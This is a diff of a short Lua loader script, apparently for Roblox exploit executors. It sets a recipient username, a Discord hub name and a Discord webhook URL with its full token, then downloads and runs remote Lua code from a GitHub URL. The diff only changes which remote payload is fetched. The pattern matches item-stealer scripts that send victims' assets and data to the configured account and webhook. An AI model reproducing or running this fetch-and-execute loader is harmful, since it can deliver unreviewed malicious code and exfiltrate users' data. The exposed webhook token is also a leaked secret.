@@ -1,4 +1,4 @@
 _G.Username = "KaikerRu"
 _G.HubName = ".gg/PogChamp"
 _G.WebhookUrl = "https://discord.com/api/webhooks/1094518534199066714/nahdTwbui9Sj2f2bQQgPvHFO-Ahps2yV2lWQ-iWlGHZBGTnawrbgth0-t9UmGYO0D1SB"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SpAmz4r/Kai/main/Kai%22))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua%22))()
